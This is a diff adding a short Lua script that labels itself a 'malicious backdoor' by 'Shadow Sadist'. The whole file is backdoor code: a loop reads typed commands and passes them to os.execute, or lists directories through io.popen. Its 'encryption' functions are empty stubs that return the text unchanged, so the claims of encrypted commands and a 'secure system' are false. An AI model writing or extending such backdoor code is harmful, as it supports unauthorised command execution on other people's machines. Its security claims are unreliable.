@@ -1,0 +1,50 @@
+-- advanced backdoor  by Shadow Sadist
+-- malicious backdoor 
+-- Advanced backdoor script with enhanced functionality
+local function Encrypt(text)
+    -- Implement your encryption algorithm here
+    return text
+end
+
+local function Decrypt(ciphertext)
+    -- Implement your decryption algorithm here
+    return ciphertext
+end
+
+local function ExecuteCommand(command)
+    print("Executing command: " .. command)
+    os.execute(command)
+end
+
+local function ListFiles(directory)
+    local files = io.popen('dir "' .. directory .. '" /b'):read("*a")
+    print("Files in directory '" .. directory .. "':")
+    print(files)
+end
+
+local function Backdoor()
+    print("Backdoor activated. Welcome to the enhanced secure system!")
+    while true do
+        io.write("Enter an encrypted command (or 'exit' to quit): ")
+        local encryptedCommand = io.read()
+
+        if encryptedCommand == "exit" then
+            print("Exiting the backdoor. Goodbye!")
+            break
+        else
+            local command = Decrypt(encryptedCommand)
+            print("Decrypted command: " .. command)
+
+            if command:sub(1, 4) == "exec" then
+                ExecuteCommand(command:sub(6))  -- Remove "exec " prefix
+            elseif command:sub(1, 4) == "list" then
+                ListFiles(command:sub(6))  -- Remove "list " prefix
+            else
+                print("Unknown command. Try 'exec' or 'list'.")
+            end
+        end
+    end
+end
+
+-- Execute the backdoor function
+Backdoor()
